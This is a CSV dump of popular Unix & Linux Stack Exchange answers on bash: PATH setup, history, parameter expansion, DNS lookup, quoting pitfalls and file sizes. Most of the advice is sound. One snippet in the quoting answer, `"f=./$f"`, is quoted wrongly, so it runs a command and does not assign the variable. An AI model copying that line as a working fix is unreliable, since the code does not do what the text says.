Title,Id,Tags,Score,Body
"How to correctly add a path to PATH?","26047","<bash><environment-variables><path><bashrc>","1090","<h3>The simple stuff</h3>

<pre><code>PATH=$PATH:~/opt/bin
</code></pre>

<p>or</p>

<pre><code>PATH=~/opt/bin:$PATH
</code></pre>

<p>depending on whether you want to add <code>~/opt/bin</code> at the end (to be searched after all other directories, in case there is a program by the same name in multiple directories) or at the beginning (to be searched before all other directories).</p>

<p>You can add multiple entries at the same time. <code>PATH=$PATH:~/opt/bin:~/opt/node/bin</code> or variations on the ordering work just fine. Don't put <code>export</code> at the beginning of the line as it has additional complications (see below under “Notes on shells other than bash”).</p>

<p>If your <code>PATH</code> gets built by many different components, you might end up with duplicate entries. See <a href=""https://unix.stackexchange.com/questions/25605/how-to-add-home-directory-path-to-be-discovered-by-unix-which-command"">How to add home directory path to be discovered by Unix which command?</a> and <a href=""https://unix.stackexchange.com/questions/40749/remove-duplicate-path-entries-with-awk-command"">Remove duplicate $PATH entries with awk command</a> to avoid adding duplicates or remove them.</p>

<p>Some distributions automatically put <code>~/bin</code> in your PATH if it exists, by the way.</p>

<h3>Where to put it</h3>

<p>Put the line to modify <code>PATH</code> in <code>~/.profile</code>, or in <code>~/.bash_profile</code> if that's what you have.</p>

<p>Note that <code>~/.bash_rc</code> is not read by any program, and <code>~/.bashrc</code> is the configuration file of interactive instances of bash. You should not define environment variables in <code>~/.bashrc</code>. The right place to define environment variables such as <code>PATH</code> is <code>~/.profile</code> (or <code>~/.bash_profile</code> if you don't care about shells other than bash). See <a href=""https://superuser.com/questions/183870/difference-between-bashrc-and-bash-profile/183980#183980"">What's the difference between them and which one should I use?</a></p>

<p>Don't put it in <code>/etc/environment</code> or <code>~/.pam_environment</code>: these are not shell files, you can't use substitutions like <code>$PATH</code> in there. In these files, you can only override a variable, not add to it.</p>

<h3>Potential complications in some system scripts</h3>

<p>You don't need <code>export</code> if the variable is already in the environment: any change of the value of the variable is reflected in the environment.¹ <code>PATH</code> is pretty much always in the environment; all unix systems set it very early on (usually in the very first process, in fact).</p>

<p>At login time, you can rely on <code>PATH</code> being already in the environment, and already containing some system directories. If you're writing a script that may be executed early while setting up some kind of virtual environment, you may need to ensure that <code>PATH</code> is non-empty and exported: if <code>PATH</code> is still unset, then something like <code>PATH=$PATH:/some/directory</code> would set <code>PATH</code> to <code>:/some/directory</code>, and the empty component at the beginning means the current directory (like <code>.:/some/directory</code>).</p>

<pre><code>if [ -z ""${PATH-}"" ]; then export PATH=/usr/local/bin:/usr/bin:/bin; fi
</code></pre>

<h3>Notes on shells other than bash</h3>

<p>In bash, ksh and zsh, <code>export</code> is special syntax, and both <code>PATH=~/opt/bin:$PATH</code> and <code>export PATH=~/opt/bin:$PATH</code> do the right thing even. In other Bourne/POSIX-style shells such as dash (which is <code>/bin/sh</code> on many systems), <code>export</code> is parsed as an ordinary command, which implies two differences:</p>

<ul>
<li><code>~</code> is only parsed at the beginning of a word, except in assignments (see <a href=""https://unix.stackexchange.com/questions/25605/how-to-add-home-directory-path-to-be-discovered-by-unix-which-command/25704#25704"">How to add home directory path to be discovered by Unix which command?</a> for details);</li>
<li><code>$PATH</code> outside double quotes <a href=""https://unix.stackexchange.com/questions/131766/why-does-my-shell-script-choke-on-whitespace-or-other-special-characters"">breaks if <code>PATH</code> contains whitespace or <code>\[*?</code></a>.</li>
</ul>

<p>So in shells like dash, <strike><code>export PATH=~/opt/bin:$PATH</code></strike> sets <code>PATH</code> to the literal string <code>~/opt/bin/:</code> followed by the value of <code>PATH</code> up to the first space.
<code>PATH=~/opt/bin:$PATH</code> (a bare assignment) <a href=""https://unix.stackexchange.com/questions/68694/when-is-double-quoting-necessary/68748#68748"">doesn't require quotes</a> and does the right thing. If you want to use <code>export</code> in a portable script, you need to write <code>export PATH=""$HOME/opt/bin:$PATH""</code>, or <code>PATH=~/opt/bin:$PATH; export PATH</code> (or <code>PATH=$HOME/opt/bin:$PATH; export PATH</code> for portability to even the Bourne shell that didn't accept <code>export var=value</code> and didn't do tilde expansion).</p>

<p>¹ <sub> This wasn't true in Bourne shells (as in the actual Bourne shell, not modern POSIX-style shells), but you're highly unlikely to encounter such old shells these days. </sub>  </p>
"
"Preserve bash history in multiple terminal windows","1288","<bash><command-history>","604","<p>Add the following to your <code>~/.bashrc</code>:</p>
<pre class=""lang-sh prettyprint-override""><code># Avoid duplicates
HISTCONTROL=ignoredups:erasedups
# When the shell exits, append to the history file instead of overwriting it
shopt -s histappend

# After each command, append to the history file and reread it
PROMPT_COMMAND=&quot;${PROMPT_COMMAND:+$PROMPT_COMMAND$'\n'}history -a; history -c; history -r&quot;
</code></pre>
"
"How to cycle through reverse-i-search in BASH?","73498","<bash>","580","<p>If I understand the question correctly you should be able to cycle through
alternatives by repeatedly hitting <kbd>Ctrl+R</kbd>.</p>

<p>E.g.:</p>

<p><kbd>Ctrl+R</kbd>
<code>grep</code>
<kbd>Ctrl+R</kbd>
<kbd>Ctrl+R</kbd>
...</p>

<p>That searches backwards through your history.  To search forward instead, use <kbd>Ctrl+S</kbd>, but you may need to have set: <code>stty -ixon</code> (either by <code>.bash_profile</code> or manually) prior to that to disable the XON/XOFF feature which takes over <kbd>Ctrl+s</kbd>.  (More details <a href=""https://stackoverflow.com/a/791800/162094"">here</a>.)</p>
"
"Using ""${a:-b}"" for variable assignment in scripts","122845","<bash><shell-script><scripting><variable>","565","<p>This technique allows for a variable to be assigned a value if another variable is either empty or is undefined. <strong>NOTE:</strong> This ""other variable"" can be the same or another variable.</p>

<p><em>excerpt</em></p>

<pre><code>${parameter:-word}
    If parameter is unset or null, the expansion of word is substituted. 
    Otherwise, the value of parameter is substituted.
</code></pre>

<p><strong>NOTE:</strong> This form also works, <code>${parameter-word}</code>. If you'd like to see a full list of all forms of parameter expansion available within Bash then I highly suggest you take a look at this topic in the Bash Hacker's wiki titled: ""<a href=""http://wiki.bash-hackers.org/syntax/pe"" rel=""noreferrer"">Parameter expansion</a>"".</p>

<h3>Examples</h3>

<em>variable doesn't exist</em>

<pre><code>$ echo ""$VAR1""

$ VAR1=""${VAR1:-default value}""
$ echo ""$VAR1""
default value
</code></pre>

<em>variable exists</em>

<pre><code>$ VAR1=""has value""
$ echo ""$VAR1""
has value

$ VAR1=""${VAR1:-default value}""
$ echo ""$VAR1""
has value
</code></pre>

<p>The same thing can be done by evaluating other variables, or running commands within the default value portion of the notation.</p>

<pre><code>$ VAR2=""has another value""
$ echo ""$VAR2""
has another value
$ echo ""$VAR1""

$

$ VAR1=""${VAR1:-$VAR2}""
$ echo ""$VAR1""
has another value
</code></pre>

<h3>More Examples</h3>

<p>You can also use a slightly different notation where it's just <code>VARX=${VARX-&lt;def. value&gt;}</code>.</p>

<pre><code>$ echo ""${VAR1-0}""
has another value
$ echo ""${VAR2-0}""
has another value
$ echo ""${VAR3-0}""
0
</code></pre>

<p>In the above <code>$VAR1</code> &amp; <code>$VAR2</code> were already defined with the string ""has another value"" but <code>$VAR3</code> was undefined, so the default value was used instead, <code>0</code>.</p>

<h3>Another Example</h3>

<pre><code>$ VARX=""${VAR3-0}""
$ echo ""$VARX""
0
</code></pre>

<h3>Checking and assigning using <code>:=</code> notation</h3>

<p>Lastly I'll mention the handy operator, <code>:=</code>. This will do a check and assign a value if the variable under test is empty or undefined.</p>

<h3>Example</h3>

<p>Notice that <code>$VAR1</code> is now set. The operator <code>:=</code> did the test and the assignment in a single operation.</p>

<pre><code>$ unset VAR1
$ echo ""$VAR1""

$ echo ""${VAR1:=default}""
default
$ echo ""$VAR1""
default
</code></pre>

<p>However if the value is set prior, then it's left alone.</p>

<pre><code>$ VAR1=""some value""
$ echo ""${VAR1:=default}""
some value
$ echo ""$VAR1""
some value
</code></pre>

<h3>Handy Dandy Reference Table</h3>

<p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=""https://i.stack.imgur.com/T2Fp8.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/T2Fp8.png"" alt=""ss of table""></a></p>

<h3>References</h3>

<ul>
<li><a href=""http://wiki.bash-hackers.org/syntax/pe"" rel=""noreferrer"">Parameter Expansions - Bash Hackers Wiki</a></li>
<li><a href=""http://www.tldp.org/LDP/abs/html/parameter-substitution.html"" rel=""noreferrer"">10.2. Parameter Substitution</a></li>
<li><a href=""http://www.gnu.org/software/bash/manual/html_node/Shell-Parameter-Expansion.html"" rel=""noreferrer"">Bash Parameter Expansions</a></li>
</ul>
"
"How can I resolve a hostname to an IP address in a Bash script?","20784","<linux><bash><networking><dns>","480","<p>You can use <code>getent</code>, which comes with <code>glibc</code> (so you almost certainly have it on Linux). This resolves using gethostbyaddr/gethostbyname2, and so also will check <code>/etc/hosts</code>/NIS/etc:</p>

<pre><code>getent hosts unix.stackexchange.com | awk '{ print $1 }'
</code></pre>

<p>Or, as Heinzi said below, you can use <code>dig</code> with the <code>+short</code> argument (queries DNS servers directly, does not look at <code>/etc/hosts</code>/NSS/etc) :</p>

<pre><code>dig +short unix.stackexchange.com
</code></pre>

<p>If <code>dig +short</code> is unavailable, any one of the following should work. All of these query DNS directly and ignore other means of resolution:</p>

<pre><code>host unix.stackexchange.com | awk '/has address/ { print $4 }'
nslookup unix.stackexchange.com | awk '/^Address: / { print $2 }'
dig unix.stackexchange.com | awk '/^;; ANSWER SECTION:$/ { getline ; print $5 }'
</code></pre>

<p>If you want to only print one IP, then add the <code>exit</code> command to <code>awk</code>'s workflow.</p>

<pre><code>dig +short unix.stackexchange.com | awk '{ print ; exit }'
getent hosts unix.stackexchange.com | awk '{ print $1 ; exit }'
host unix.stackexchange.com | awk '/has address/ { print $4 ; exit }'
nslookup unix.stackexchange.com | awk '/^Address: / { print $2 ; exit }'
dig unix.stackexchange.com | awk '/^;; ANSWER SECTION:$/ { getline ; print $5 ; exit }'
</code></pre>
"
"How to get execution time of a script effectively?","52313","<bash><profiling>","467","<p>Just use <code>time</code> when you call the script:</p>

<pre><code>time yourscript.sh
</code></pre>
"
"In Bash, when to alias, when to script, and when to write a function?","30925","<bash><shell-script><alias><function>","387","<p>An alias should effectively not (in general) do more than change the default options of a command. It is nothing more than simple text replacement on the command name.  It can't do anything with arguments but pass them to the command it actually runs. So if you simply need to add an argument at the front of a single command, an alias will work.  Common examples are</p>

<pre><code># Make ls output in color by default.
alias ls=""ls --color=auto""
# make mv ask before overwriting a file by default
alias mv=""mv -i""
</code></pre>

<p>A function should be used when you need to do something more complex than an alias but that wouldn't be of use on its own.  For example, take <a href=""https://unix.stackexchange.com/a/25549/11750"">this answer</a> on a question I asked about changing <code>grep</code>'s default behavior depending on whether it's in a pipeline:</p>

<pre><code>grep() { 
    if [[ -t 1 ]]; then 
        command grep -n ""$@""
    else 
        command grep ""$@""
    fi
}
</code></pre>

<p>It's a perfect example of a function because it is too complex for an alias (requiring different defaults based on a condition), but it's not something you'll need in a non-interactive script.  </p>

<p>If you get too many functions or functions too big, put them into separate files in a hidden directory, and source them in your <code>~/.bashrc</code>:</p>

<pre><code>if [ -d ~/.bash_functions ]; then
    for file in ~/.bash_functions/*; do
        . ""$file""
    done
fi
</code></pre>

<p>A script should stand on its own. It should have value as something that can be re-used, or used for more than one purpose.</p>
"
"How do I loop through only directories in bash?","86722","<bash><files><directory>","342","<p>If you need to select more specific files than only directories use <code>find</code> and pass it to <code>while read</code>:</p>

<pre><code>shopt -s dotglob
find * -prune -type d | while IFS= read -r d; do 
    echo ""$d""
done
</code></pre>

<p>Use <code>shopt -u dotglob</code> to exclude hidden directories (or <code>setopt dotglob</code>/<code>unsetopt dotglob</code> in zsh).</p>

<p><code>IFS=</code> to avoid splitting filenames containing one of the <code>$IFS</code>, for example: <code>'a b'</code></p>

<p>see <a href=""https://unix.stackexchange.com/a/96912/20661"">AsymLabs answer</a> below for more <code>find</code> options</p>

<hr>

<p>edit:<br>
In case you need to create an exit value from within the while loop, you can circumvent the extra subshell by this trick:</p>

<pre><code>while IFS= read -r d; do 
    if [ ""$d"" == ""something"" ]; then exit 1; fi
done &lt; &lt;(find * -prune -type d)
</code></pre>
"
"Why does my shell script choke on whitespace or other special characters?","131766","<bash><shell><shell-script><quoting><whitespace>","322","<h2>Always use double quotes around variable substitutions and command substitutions: <code>""$foo""</code>, <code>""$(foo)""</code></h2>

<p>If you use <code>$foo</code> unquoted, your script will choke on input or parameters (or command output, with <code>$(foo)</code>) containing whitespace or <code>\[*?</code>.</p>

<p>There, you can stop reading. Well, ok, here are a few more:</p>

<ul>
<li><code>read</code> — <strong>To read input line by line with the <code>read</code> builtin, use <code>while IFS= read -r line; do …</code></strong><br>
Plain <code>read</code> treats backslashes and whitespace specially.</li>
<li><code>xargs</code> — <strong>Avoid <code>xargs</code></strong>. If you must use <code>xargs</code>, make that <code>xargs -0</code>. Instead of <code>find … | xargs</code>, <strong>prefer <code>find … -exec …</code></strong>.<br>
<code>xargs</code> treats whitespace and the characters <code>\""'</code> specially.</li>
</ul>

<p>This answer applies to Bourne/POSIX-style shells (<code>sh</code>, <code>ash</code>, <code>dash</code>, <code>bash</code>, <code>ksh</code>, <code>mksh</code>, <code>yash</code>…). Zsh users should skip it and read the end of <a href=""https://unix.stackexchange.com/questions/68694/when-is-double-quoting-necessary/68748#68748"">When is double-quoting necessary?</a> instead. If you want the whole nitty-gritty, <a href=""http://pubs.opengroup.org/onlinepubs/009695399/utilities/xcu_chap02.html#tag_02_06"" rel=""noreferrer"">read the standard</a> or your shell's manual.</p>

<hr>

<p>Note that the explanations below contains a few approximations (statements that are true in most conditions but can be affected by the surrounding context or by configuration).</p>

<h2>Why do I need to write <code>""$foo""</code>? What happens without the quotes?</h2>

<p><code>$foo</code> does not mean “take the value of the variable <code>foo</code>”. It means something much more complex:</p>

<ul>
<li>First, take the value of the variable.</li>
<li>Field splitting: treat that value as a whitespace-separated list of fields, and build the resulting list. For example, if the variable contains <code>foo *  bar ​</code> then the result of this step is the 3-element list <code>foo</code>, <code>*</code>, <code>bar</code>.</li>
<li>Filename generation: treat each field as a glob, i.e. as a wildcard pattern, and replace it by the list of file names that match this pattern. If the pattern doesn't match any files, it is left unmodified. In our example, this results in the list containing <code>foo</code>, following by the list of files in the current directory, and finally <code>bar</code>. If the current directory is empty, the result is <code>foo</code>, <code>*</code>, <code>bar</code>.</li>
</ul>

<p>Note that the result is a list of strings. There are two contexts in shell syntax: list context and string context. Field splitting and filename generation only happen in list context, but that's most of the time. Double quotes delimit a string context: the whole double-quoted string is a single string, not to be split. (Exception: <code>""$@""</code> to expand to the list of positional parameters, e.g. <code>""$@""</code> is equivalent to <code>""$1"" ""$2"" ""$3""</code> if there are three positional parameters. See <a href=""https://unix.stackexchange.com/questions/41571/what-is-the-difference-between-and/94200#94200"">What is the difference between $* and $@?</a>)</p>

<p>The same happens to command substitution with <code>$(foo)</code> or with <code>`foo`</code>. On a side note, don't use <code>`foo`</code>: its quoting rules are weird and non-portable, and all modern shells support <code>$(foo)</code> which is absolutely equivalent except for having intuitive quoting rules.</p>

<p>The output of arithmetic substitution also undergoes the same expansions, but that isn't normally a concern as it only contains non-expandable characters (assuming <code>IFS</code> doesn't contain digits or <code>-</code>).</p>

<p>See <a href=""https://unix.stackexchange.com/questions/68694/when-is-double-quoting-necessary"">When is double-quoting necessary?</a> for more details about the cases when you can leave out the quotes.</p>

<p>Unless you mean for all this rigmarole to happen, just remember to always use double quotes around variable and command substitutions. Do take care: leaving out the quotes can lead not just to errors but to <a href=""https://unix.stackexchange.com/questions/171346/security-implications-of-forgetting-to-quote-a-variable-in-bash-posix-shells/171347#171347"">security holes</a>.</p>

<h3>How do I process a list of file names?</h3>

<p>If you write <code>myfiles=""file1 file2""</code>, with spaces to separate the files, this can't work with file names containing spaces. Unix file names can contain any character other than <code>/</code> (which is always a directory separator) and null bytes (which you can't use in shell scripts with most shells).</p>

<p>Same problem with <code>myfiles=*.txt; … process $myfiles</code>. When you do this, the variable <code>myfiles</code> contains the 5-character string <code>*.txt</code>, and it's when you write <code>$myfiles</code> that the wildcard is expanded. This example will actually work, until you change your script to be <code>myfiles=""$someprefix*.txt""; … process $myfiles</code>. If <code>someprefix</code> is set to <code>final report</code>, this won't work.</p>

<p>To process a list of any kind (such as file names), put it in an array. This requires mksh, ksh93, yash or bash (or zsh, which doesn't have all these quoting issues); a plain POSIX shell (such as ash or dash) doesn't have array variables.</p>

<pre><code>myfiles=(""$someprefix""*.txt)
process ""${myfiles[@]}""
</code></pre>

<p>Ksh88 has array variables with a different assignment syntax <code>set -A myfiles ""someprefix""*.txt</code> (see <a href=""https://stackoverflow.com/questions/22862038/assignation-variable-under-different-ksh-environment"">assignation variable under different ksh environment</a> if you need ksh88/bash portability). Bourne/POSIX-style shells have a single one array, the array of positional parameters <code>""$@""</code> which you set with <code>set</code> and which is local to a function:</p>

<pre><code>set -- ""$someprefix""*.txt
process -- ""$@""
</code></pre>

<h3>What about file names that begin with <code>-</code>?</h3>

<p>On a related note, keep in mind that file names can begin with a <code>-</code> (dash/minus), which most commands interpret as denoting an option. Some commands (like <code>sh</code>, <code>set</code> or <code>sort</code>) also accept options that start with <code>+</code>. If you have a file name that begins with a variable part, be sure to pass <code>--</code> before it, as in the snippet above. This indicates to the command that it has reached the end of options, so anything after that is a file name even if it starts with <code>-</code> or <code>+</code>.</p>

<p>Alternatively, you can make sure that your file names begin with a character other than <code>-</code>. Absolute file names begin with <code>/</code>, and you can add <code>./</code> at the beginning of relative names. The following snippet turns the content of the variable <code>f</code> into a “safe” way of referring to the same file that's guaranteed not to start with <code>-</code> nor <code>+</code>.</p>

<pre><code>case ""$f"" in -* | +*) ""f=./$f"";; esac
</code></pre>

<p>On a final note on this topic, beware that some commands interpret <code>-</code> as meaning standard input or standard output, even after <code>--</code>. If you need to refer to an actual file named <code>-</code>, or if you're calling such a program and you don't want it to read from stdin or write to stdout, make sure to rewrite <code>-</code> as above. See <a href=""https://unix.stackexchange.com/questions/110750/what-is-the-difference-between-du-sh-and-du-sh/110756#110756"">What is the difference between &quot;du -sh *&quot; and &quot;du -sh ./*&quot;?</a> for further discussion.</p>

<h2>How do I store a command in a variable?</h2>

<p>“Command” can mean three things: a command name (the name as an executable, with or without full path, or the name of a function, builtin or alias), a command name with arguments, or a piece of shell code. There are accordingly different ways of storing them in a variable.</p>

<p>If you have a command name, just store it and use the variable with double quotes as usual.</p>

<pre><code>command_path=""$1""
…
""$command_path"" --option --message=""hello world""
</code></pre>

<p>If you have a command with arguments, the problem is the same as with a list of file names above: this is a list of strings, not a string. You can't just stuff the arguments into a single string with spaces in between, because if you do that you can't tell the difference between spaces that are part of arguments and spaces that separate arguments. If your shell has arrays, you can use them.</p>

<pre><code>cmd=(/path/to/executable --option --message=""hello world"" --)
cmd=(""${cmd[@]}"" ""$file1"" ""$file2"")
""${cmd[@]}""
</code></pre>

<p>What if you're using a shell without arrays? You can still use the positional parameters, if you don't mind modifying them.</p>

<pre><code>set -- /path/to/executable --option --message=""hello world"" --
set -- ""$@"" ""$file1"" ""$file2""
""$@""
</code></pre>

<p>What if you need to store a complex shell command, e.g. with redirections, pipes, etc.? Or if you don't want to modify the positional parameters? Then you can build a string containing the command, and use the <code>eval</code> builtin.</p>

<pre><code>code='/path/to/executable --option --message=""hello world"" -- /path/to/file1 | grep ""interesting stuff""'
eval ""$code""
</code></pre>

<p>Note the nested quotes in the definition of <code>code</code>: the single quotes <code>'…'</code> delimit a string literal, so that the value of the variable <code>code</code> is the string <code>/path/to/executable --option --message=""hello world"" -- /path/to/file1</code>. The <code>eval</code> builtin tells the shell to parse the string passed as an argument as if it appeared in the script, so at that point the quotes and pipe are parsed, etc.</p>

<p>Using <code>eval</code> is tricky. Think carefully about what gets parsed when. In particular, you can't just stuff a file name into the code: you need to quote it, just like you would if it was in a source code file. There's no direct way to do that. Something like <code>code=""$code $filename""</code> breaks if the file name contains any shell special character (spaces, <code>$</code>, <code>;</code>, <code>|</code>, <code>&lt;</code>, <code>&gt;</code>, etc.). <code>code=""$code \""$filename\""""</code> still breaks on <code>""$\`</code>. Even <code>code=""$code '$filename'""</code> breaks if the file name contains a <code>'</code>. There are two solutions.</p>

<ul>
<li><p>Add a layer of quotes around the file name. The easiest way to do that is to add single quotes around it, and replace single quotes by <code>'\''</code>.</p>

<pre><code>quoted_filename=$(printf %s. ""$filename"" | sed ""s/'/'\\\\''/g"")
code=""$code '${quoted_filename%.}'""
</code></pre></li>
<li><p>Keep the variable expansion inside the code, so that it's looked up when the code is evaluated, not when the code fragment is built. This is simpler but only works if the variable is still around with the same value at the time the code is executed, not e.g. if the code is built in a loop.</p>

<pre><code>code=""$code \""\$filename\""""
</code></pre></li>
</ul>

<p>Finally, do you really need a variable containing code? The most natural way to give a name to a code block is to define a function.</p>

<h2>What's up with <code>read</code>?</h2>

<p>Without <code>-r</code>, <code>read</code> allows continuation lines — this is a single logical line of input:</p>

<pre><code>hello \
world
</code></pre>

<p><code>read</code> splits the input line into fields delimited by characters in <code>$IFS</code> (without <code>-r</code>, backslash also escapes those). For example, if the input is a line containing three words, then <code>read first second third</code> sets <code>first</code> to the first word of input, <code>second</code> to the second word and <code>third</code> to the third word. If there are more words, the last variable contains everything that's left after setting the preceding ones. Leading and trailing whitespace are trimmed.</p>

<p>Setting <code>IFS</code> to the empty string avoids any trimming. See <a href=""https://unix.stackexchange.com/questions/18886/why-is-while-ifs-read-used-so-often-instead-of-ifs-while-read/18936#18936"">Why is `while IFS= read` used so often, instead of `IFS=; while read..`?</a> for a longer explanation.</p>

<h2>What's wrong with <code>xargs</code>?</h2>

<p>The input format of <code>xargs</code> is whitespace-separated strings which can optionally be single- or double-quoted. No standard tool outputs this format.</p>

<p>The input to <code>xargs -L1</code> or <code>xargs -l</code> is almost a list of lines, but not quite — if there is a space at the end of a line, the following line is a continuation line.</p>

<p>You can use <code>xargs -0</code> where applicable (and where available: GNU (Linux, Cygwin), BusyBox, BSD, OSX, but it isn't in POSIX). That's safe, because null bytes can't appear in most data, in particular in file names. To produce a null-separated list of file names, use <code>find … -print0</code> (or you can use <code>find … -exec …</code> as explained below).</p>

<h3>How do I process files found by <code>find</code>?</h3>

<pre><code>find … -exec some_command a_parameter another_parameter {} +
</code></pre>

<p><code>some_command</code> needs to be an external command, it can't be a shell function or alias. If you need to invoke a shell to process the files, call <code>sh</code> explicitly.</p>

<pre><code>find … -exec sh -c '
  for x do
    … # process the file ""$x""
  done
' find-sh {} +
</code></pre>

<h2>I have some other question</h2>

<p>Browse the <a href=""/questions/tagged/quoting"" class=""post-tag"" title=""show questions tagged &#39;quoting&#39;"" rel=""tag"">quoting</a> tag on this site, or <a href=""/questions/tagged/shell"" class=""post-tag"" title=""show questions tagged &#39;shell&#39;"" rel=""tag"">shell</a> or <a href=""/questions/tagged/shell-script"" class=""post-tag"" title=""show questions tagged &#39;shell-script&#39;"" rel=""tag"">shell-script</a>. (Click on “learn more…” to see some general tips and a hand-selected list of common questions.) If you've searched and you can't find an answer, <a href=""https://unix.stackexchange.com/questions/ask"">ask away</a>.</p>
"
"How can I get the size of a file in a bash script?","16640","<bash><shell><files>","311","<p>Your best bet if on a GNU system:</p>

<pre><code>stat --printf=""%s"" file.any
</code></pre>

<p>From <a href=""https://linux.die.net/man/1/stat"" rel=""noreferrer"">man stat</a>:</p>

<blockquote>
  <p>%s total size, in bytes</p>
</blockquote>

<p>In a bash script : </p>

<pre><code>#!/bin/bash
FILENAME=/home/heiko/dummy/packages.txt
FILESIZE=$(stat -c%s ""$FILENAME"")
echo ""Size of $FILENAME = $FILESIZE bytes.""
</code></pre>

<p>NOTE: see <a href=""https://unix.stackexchange.com/a/185039/9071"">@chbrown's answer</a> for how to use stat in terminal on Mac OS X.</p>
"
